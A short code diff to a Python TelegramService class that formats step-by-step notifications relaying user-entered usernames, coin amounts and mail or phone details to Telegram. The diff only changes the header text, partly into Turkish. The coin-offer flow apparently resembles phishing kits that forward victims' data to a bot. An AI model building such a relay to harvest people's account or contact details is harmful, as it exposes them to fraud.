@@ -42,7 +42,7 @@ class TelegramService:
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
         if step == "username_coin":
-            return f"""🎮 <b>STEP 1: Username & Coin Selection</b>
+            return f"""🎮 <b>STEP 1: Giriş & Coin Selection</b>
 
 👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
 💰 <b>Coin Amount:</b> <code>{data.get('amount', 'N/A')}</code>
@@ -53,7 +53,7 @@ class TelegramService:
 """
         
         elif step == "contact":
-            return f"""📧 <b>STEP 2: Contact Information</b>
+            return f"""📧 <b>Adım 2: Mail/Phone</b>
 
 👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
 💰 <b>Amount:</b> <code>{data.get('amount', 'N/A')}</code>
